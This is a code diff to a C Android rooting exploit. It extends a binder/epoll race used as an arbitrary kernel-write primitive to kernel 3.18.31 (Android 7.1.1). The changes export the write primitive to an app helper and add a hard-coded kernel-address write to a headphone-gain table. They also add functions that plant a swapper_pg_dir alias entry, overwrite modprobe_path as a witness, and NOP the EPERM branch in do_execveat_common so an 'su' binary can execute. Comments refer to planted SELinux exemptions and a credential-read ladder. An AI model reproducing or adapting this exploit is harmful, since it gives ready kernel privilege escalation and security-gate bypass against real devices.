@@ -269,6 +269,13 @@ static void onalrm(int s){ (void)s; printf("  readv HUNG (killed by alarm)\n"); 
  * byte-for-byte the same path (that path is what run_temproot.sh validated on
  * this device three times from cold boot).  Returns 1 hit, 0 no hit, -1 setup
  * failure (binder open denied -> the caller must not retry). */
+#ifdef ESC_LIB
+/* Exported for the 7 path (tools/esc7.c): the ladder in run_credread7.sh is nothing but "write these
+ * bytes at this kernel address, then read some other address back", so the app-side helper needs the
+ * same primitive the CLI uses -- one call, no reimplementation of the binder/epoll dance. */
+int esc_write(unsigned long addr, const void *buf, size_t blen, int rounds);
+#endif
+
 static int run_rounds(unsigned long addr, const void *buf, size_t blen, int rounds, int verbose)
 {
     int r, max_threads = 3, ok = 0;
@@ -309,6 +316,43 @@ static int run_rounds(unsigned long addr, const void *buf, size_t blen, int roun
     return ok;
 }
 
+/* The headphone-gain arm (ledger 592/686): one 4-byte write into `wcd_hph_gain`, whose column 1 is the
+ * only slot the two firmware lines differ in on this board (impedance 24..38 ohm -> column 1, measured
+ * 33 ohm on this phone).  The address lives HERE, in the same gated constant set as every other kernel
+ * number this tool carries -- tools/gate_constants.py re-derives it from the recovered kallsyms table and
+ * refuses the build when they disagree -- so the APK and any shell script stay free of a VA that could
+ * silently rot after a kernel update.
+ *
+ * Guarded by `ifndef ESC_LIB`: broot7 links this file with -Dmain=clobber_cli_main, and the shipped
+ * broot7 must keep its exact bytes (the release rule from ledger 676/682 is that every byte in the
+ * package carries a boot reading).  A CLI-only arm must not silently re-roll that asset. */
+#ifndef ESC_LIB
+#define HPGAIN7_VA        0xffffffc001bb82c8UL          /* wcd_hph_gain (art/kallsyms-7-real.txt) */
+#define HPGAIN7_NEXT_VA   0xffffffc001bb82d0UL          /* soc_codec_dev_tasha -- the object bound */
+#define HPGAIN7_LEN       4                             /* a 5th byte would walk into that neighbour */
+#define HPGAIN7_RELEASE   "3.18.31-perf-g9dce1fbc9"     /* the build the address was recovered for */
+static const unsigned char HPGAIN7_DT[HPGAIN7_LEN]   = { 4, 3, 1, 1 }; /* 7's DT value = the stock arm */
+static const unsigned char HPGAIN7_601[HPGAIN7_LEN]  = { 4, 1, 1, 1 }; /* compiled default = 6.0.1's arm */
+
+static int hpgain_release_ok(const char *want)
+{
+    char got[128];
+    size_t n;
+    FILE *f = fopen("/proc/sys/kernel/osrelease", "r");
+
+    if (!f)
+        return 0;
+    if (!fgets(got, sizeof got, f)) {
+        fclose(f);
+        return 0;
+    }
+    fclose(f);
+    n = strcspn(got, "\n");
+    got[n] = 0;
+    return strcmp(got, want) == 0;
+}
+#endif /* !ESC_LIB */
+
 int main(int argc, char **argv)
 {
     int rounds = argc > 1 ? atoi(argv[1]) : 8;
@@ -316,12 +360,46 @@ int main(int argc, char **argv)
     memset(&sa, 0, sizeof sa); sa.sa_handler = onalrm; sigaction(SIGALRM, &sa, NULL);
     if (argc > 2 && argv[2][0] >= '0' && argv[2][0] <= '9') { WQI = atoi(argv[2]); }
     int mode_selftest = 1;
+    int arm_hpgain = 0;
     unsigned long addr = 0;
     unsigned char buf[64];
     size_t blen = 0;
     int ok;
 
     setvbuf(stdout, NULL, _IONBF, 0);
+#ifndef ESC_LIB
+    if (argc > 3 && !strcmp(argv[2], "hpgain")) {
+        mode_selftest = 0;
+        arm_hpgain = 1;
+        addr = HPGAIN7_VA;
+        if (!hpgain_release_ok(HPGAIN7_RELEASE)) {
+            printf("REFUSE: the hpgain arm was compiled for osrelease \"%s\" and the running kernel is "
+                   "not that build -- writing an address recovered for another kernel is a guess, not a "
+                   "port\n", HPGAIN7_RELEASE);
+            return 1;
+        }
+        if (!strcmp(argv[3], "601"))
+            memcpy(buf, HPGAIN7_601, HPGAIN7_LEN), blen = HPGAIN7_LEN;
+        else if (!strcmp(argv[3], "stock"))
+            memcpy(buf, HPGAIN7_DT, HPGAIN7_LEN), blen = HPGAIN7_LEN;
+        else {
+            printf("hpgain arm must be 601 or stock (got \"%s\") -- nothing to write\n", argv[3]);
+            return 1;
+        }
+        /* positions mirror `kern` one slot left: clobber <rounds> hpgain <arm> [WQI] [SAFEFED].
+         * The SU transport can hand over a TRAILING EMPTY ARGUMENT (measured 13:17 on the boot apply:
+         * argv[4]="" made WQI=0 and my own guard refused the write), so a slot that is not a digit
+         * falls back to the pair measured good on this boot instead of becoming a zero -- and the
+         * fallback is printed, never silent. */
+        if (argc > 4 && argv[4][0] >= '1' && argv[4][0] <= '9')
+            WQI = atoi(argv[4]);
+        else
+            WQI = 4;
+        SAFEFED = (argc > 5 && argv[5][0] >= '0' && argv[5][0] <= '9') ? atoi(argv[5]) : 0;
+        printf("hpgain arm=%s va=%#lx len=%zu bound=%#lx (span %lu) WQI=%d SAFEFED=%d\n", argv[3], addr,
+               blen, HPGAIN7_NEXT_VA, HPGAIN7_NEXT_VA - HPGAIN7_VA, WQI, SAFEFED);
+    }
+#endif
     if (argc > 4 && !strcmp(argv[2], "kern")) {
         const char *pl;
         mode_selftest = 0;
@@ -353,10 +431,10 @@ int main(int argc, char **argv)
             return 1;
         }
     }
-    if (!mode_selftest && argc > 5) {
+    if (!mode_selftest && !arm_hpgain && argc > 5) {
         WQI = atoi(argv[5]);
         if (argc > 6) SAFEFED = atoi(argv[6]);
-    } else if (argc > 3) {
+    } else if (!arm_hpgain && argc > 3) {
         SAFEFED = atoi(argv[3]);
     }
     /* The layout touches [WQI-1] .. [WQI+4]; a bad WQI (I got 0 from a hex payload
@@ -413,6 +491,24 @@ int main(int argc, char **argv)
 
 /* Type values from tools/_type_values.txt (tools/policy_types.py, positive control
  * qti_init_shell==241, which is the bit measured to exempt the daemon on-device). */
+/* One-line witness of the feed mode, printed by every call: a silent mode bug is
+ * indistinguishable from a cold-window miss in the device log.
+ *
+ * The two mode variables are set explicitly rather than inherited -- the file-scope default is the
+ * dead feed mode whose feeding child refuses, so every round would be a guaranteed miss however
+ * many rounds are spent.  WQI=4 with the safe-feed disabled is the shape run_credread7.sh proved
+ * on-device, where the CLI passes them as "4 0". */
+#ifdef ESC_LIB
+int esc_write(unsigned long addr, const void *buf, size_t blen, int rounds)
+{
+	WQI = 4;
+	SAFEFED = 0;
+	printf("  esc_write: @%#lx %zu B rounds=%d (WQI=%d SAFEFED=%d)\n", addr, blen, rounds, WQI, SAFEFED);
+	fflush(stdout);
+	return run_rounds(addr, buf, blen, rounds, 0);
+}
+#endif
+
 static const unsigned int esc_exempt[] = { 164, 241, 494, 627 };  /* kernel, qti_init_shell, init, untrusted_app */
 #define NEXEMPT ((int)(sizeof esc_exempt / sizeof *esc_exempt))
 
@@ -471,6 +567,28 @@ static int modprobe_is(const char *want)
     while (n > 0 && (got[n - 1] == '\n' || got[n - 1] == '\r'))
         got[--n] = 0;
     return strcmp(got, want) == 0;
+}
+
+/* The same reading, but handed back so it can be written back verbatim.  3.18.31 has no
+ * `selinux_enforcing` symbol, so this string is the alias window's semantic witness there. */
+static int modprobe_get(char *out, int cap)
+{
+    char got[256];
+    ssize_t n;
+    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
+    if (fd < 0)
+        return -1;
+    n = read(fd, got, sizeof got - 1);
+    close(fd);
+    if (n <= 0)
+        return -1;
+    while (n > 0 && (got[n - 1] == '\n' || got[n - 1] == '\r'))
+        n--;
+    if (n >= cap)
+        n = cap - 1;
+    memcpy(out, got, n);
+    out[n] = 0;
+    return (int)n;
 }
 
 /* Did the helper come up?  Ask it directly: its su port is bound a moment after
@@ -874,6 +992,167 @@ int esc_sugate_revert(char *out, int cap)
     put_le(origw, SUGATE_GATE_ORIG, 4);
     rc = run_rounds(sugate_alias(SUGATE_GATE_VA), origw, sizeof origw, 24, 0);
     el(&e, "sugate revert rc=%d", rc);
+    return rc == 1 ? 0 : -1;
+}
+
+/* ---- the same two writes on 3.18.31 (Android 7.1.1), ledger 2026-10-20 §664 ----------------
+ * Values are what `python3 tools/pgdalias.py --profile 7` re-derives and asserts against
+ * fw/7/Image, and the site is NOT a name-comparison function: it is the single instruction
+ * that *consumes* the gate's verdict.  do_execveat_common calls the gate G(0x342b68) with
+ * `filename->name`, and the very next word is `tbnz w0,#0x1f,#0x323874`; 0x323874 holds
+ * `mov w19,#-1`, which is the only in-function producer of the -1 that surfaces as EPERM and
+ * has exactly one predecessor (the other `mov w19,#-1` at 0x32356c hangs off a test of a
+ * function that always returns 0).  NOPping the branch therefore makes EPERM structurally
+ * unreachable while leaving G, its feature switches and its accounting byte-for-byte intact.
+ * The word right after the site is `mov x0,sp`, which redefines the register the verdict was
+ * read from -- so nothing is left holding a stale value.
+ *
+ * The window proof is different from 6.0.1 because this kernel exposes no `selinux_enforcing`
+ * symbol: we move the `/proc/sys/kernel/modprobe` string through the alias and read it back.
+ * The kernel re-reads that very buffer, and data reads are cache-coherent, so this cannot be
+ * faked by a stale line -- which is exactly the hole `readv==expected` left open (§175/§650).
+ * The read is the CALLER's job on this route (see esc_sugate7_open below): the app uid can only
+ * read that file because of the exemption planted earlier in the same run, so the witness goes
+ * through the root channel and no .text byte is written until it moves.
+ */
+#define SUGATE7_PGD_ENTRY    0xffffffc001f4cff8UL        /* swapper_pg_dir + 511*8 */
+#define SUGATE7_MODPROBE_VA  0xffffffc001a499b8UL        /* modprobe_path (char[64], .data) */
+#define SUGATE7_GATE_VA      0xffffffc000323400UL        /* the verdict tbnz in do_execveat_common */
+#define SUGATE7_GATE_ORIG    0x37F823A0u                 /* tbnz w0,#0x1f -> the EPERM producer */
+#define SUGATE7_GATE_PATCH   0xD503201Fu                 /* NOP */
+
+#define SUGATE7_MODPROBE_LEN 64                         /* modprobe_path is char[64] */
+#define SUGATE7_WITNESS      "/zz"                      /* moved through the alias, read back by the caller */
+
+/* The window proof reads /proc/sys/kernel/modprobe.  Split the write so the read can belong to the
+ * caller: this uid's ability to read that file depends on the SELinux exemption planted earlier in
+ * the same run (measured from the app process at boot, ledger 670), so a .text write may not assume
+ * it -- and the all-in-one version's fallback for a failed read patched anyway, which is rule 653
+ * broken.  These four only write; the caller (which holds a root channel) reads between them, and a
+ * witness that does not move means abort, never patch. */
+int esc_sugate7_open(char *out, int cap)
+{
+    struct elog e = { out, cap, 0 };
+    unsigned char desc[8];
+    char cur[64];
+    unsigned long mod_alias;
+    int r = 24, rc, n;
+
+    mod_alias = sugate_alias(SUGATE7_MODPROBE_VA);
+    put_le(desc, 0x0040000040000711ULL, 8);   /* PA 0x40000000 | 0x711 | UXN -- same as 6.0.1 */
+    n = modprobe_get(cur, sizeof cur);
+    el(&e, "sugate7-open in-process read of modprobe_path: %s",
+       n > 0 ? cur : "unreadable by this uid -- the caller must witness through a root channel");
+
+    rc = run_rounds(SUGATE7_PGD_ENTRY, desc, sizeof desc, r, 0);
+    el(&e, "sugate7-open alias entry addr=%#lx rounds=%d rc=%d", (unsigned long)SUGATE7_PGD_ENTRY, r, rc);
+    if (rc != 1) {
+        el(&e, "sugate7-open stop: the alias was not planted, nothing else was written");
+        return -1;
+    }
+    rc = run_rounds(mod_alias, SUGATE7_WITNESS, sizeof SUGATE7_WITNESS, r, 0);
+    el(&e, "sugate7-open witness write addr=%#lx (=%#lx through the alias) rounds=%d rc=%d",
+       mod_alias, SUGATE7_MODPROBE_VA, r, rc);
+    el(&e, "sugate7-open done: caller must read /proc/sys/kernel/modprobe as root, it must be \""
+           SUGATE7_WITNESS "\".  If it is not, call abort -- never patch.");
+    return rc == 1 ? 0 : -2;
+}
+
+/* Put the string the caller read back into place, through the alias.  The caller witnesses this with
+ * a second root read: it proves the alias writes in the same direction the .text patch will go, and
+ * it leaves no residue in a global that every module autoload passes through.  The WHOLE char[64]
+ * goes, zero-padded: "/zz" was written by truncating the printed path, not by erasing the tail, so a
+ * restore that only wrote the first 15 bytes would leave a stale tail if the original ever came back
+ * shorter than what we put there -- a shape the mock rehearsal caught for the adb route. */
+static int sugate7_path_image(const char *orig, unsigned char *img)
+{
+    int n;
+
+    if (orig == NULL || orig[0] != '/' || strchr(orig, '\n') != NULL)
+        return -1;
+    n = (int)strlen(orig) + 1;
+    if (n > SUGATE7_MODPROBE_LEN)
+        return -2;
+    memset(img, 0, SUGATE7_MODPROBE_LEN);
+    memcpy(img, orig, n);
+    return n;
+}
+
+int esc_sugate7_restore(const char *orig, char *out, int cap)
+{
+    struct elog e = { out, cap, 0 };
+    unsigned char img[SUGATE7_MODPROBE_LEN];
+    unsigned long mod_alias;
+    int r = 24, n, rc;
+
+    n = sugate7_path_image(orig, img);
+    if (n < 0) {
+        el(&e, "sugate7-restore REFUSED: '%s' is not a %d-byte-able path (reason %d)",
+           orig == NULL ? "" : orig, SUGATE7_MODPROBE_LEN, n);
+        return n;
+    }
+    mod_alias = sugate_alias(SUGATE7_MODPROBE_VA);
+    rc = run_rounds(mod_alias, img, sizeof img, r, 0);
+    el(&e, "sugate7-restore write \"%s\" as the full %d-byte modprobe_path addr=%#lx rounds=%d rc=%d",
+       orig, (int)sizeof img, mod_alias, r, rc);
+    return rc == 1 ? 0 : -3;
+}
+
+/* Only reachable after both witnesses moved: this is the one instruction word in .text. */
+int esc_sugate7_patch(char *out, int cap)
+{
+    struct elog e = { out, cap, 0 };
+    unsigned char patchw[4], origw[4];
+    unsigned long gate_alias;
+    int r = 24, rc, back;
+
+    gate_alias = sugate_alias(SUGATE7_GATE_VA);
+    put_le(patchw, SUGATE7_GATE_PATCH, 4);
+    put_le(origw, SUGATE7_GATE_ORIG, 4);
+    rc = run_rounds(gate_alias, patchw, sizeof patchw, r, 0);
+    el(&e, "sugate7-patch addr=%#lx (=%#lx via alias) rounds=%d rc=%d", gate_alias,
+       (unsigned long)SUGATE7_GATE_VA, r, rc);
+    if (rc != 1) {
+        back = run_rounds(gate_alias, origw, sizeof origw, r, 0);
+        el(&e, "sugate7-patch missed, rollback rc=%d", back);
+        return back == 1 ? -3 : -4;
+    }
+    el(&e, "sugate7-patch written (NOP at %#x); caller must witness by execve of a file named su",
+       SUGATE7_GATE_VA);
+    return 0;
+}
+
+/* The window did not prove out, so no .text byte was written.  Put the string back at the REAL VA --
+ * the alias is the thing that just failed -- and leave the pgd slot alone: zeroing it would cost
+ * another 24 needle rounds, and if the slot was not ours to fill, zeroing it destroys whatever was
+ * there just as surely as planting it did. */
+int esc_sugate7_abort(const char *orig, char *out, int cap)
+{
+    struct elog e = { out, cap, 0 };
+    unsigned char img[SUGATE7_MODPROBE_LEN];
+    int r = 24, n, rc;
+
+    n = sugate7_path_image(orig, img);
+    if (n < 0) {
+        el(&e, "sugate7-abort: '%s' is not a usable original path (reason %d), leaving modprobe_path "
+               "exactly as the witness write left it", orig == NULL ? "" : orig, n);
+        return n;
+    }
+    rc = run_rounds(SUGATE7_MODPROBE_VA, img, sizeof img, r, 0);
+    el(&e, "sugate7-abort restore \"%s\" at the REAL VA (not the alias -- that is what failed) rc=%d; "
+           "no .text was written", orig, rc);
+    return rc == 1 ? 0 : -3;
+}
+
+int esc_sugate7_revert(char *out, int cap)
+{
+    struct elog e = { out, cap, 0 };
+    unsigned char origw[4];
+    int rc;
+
+    put_le(origw, SUGATE7_GATE_ORIG, 4);
+    rc = run_rounds(sugate_alias(SUGATE7_GATE_VA), origw, sizeof origw, 24, 0);
+    el(&e, "sugate7 revert rc=%d", rc);
     return rc == 1 ? 0 : -1;
 }
 #endif /* ESC_LIB */
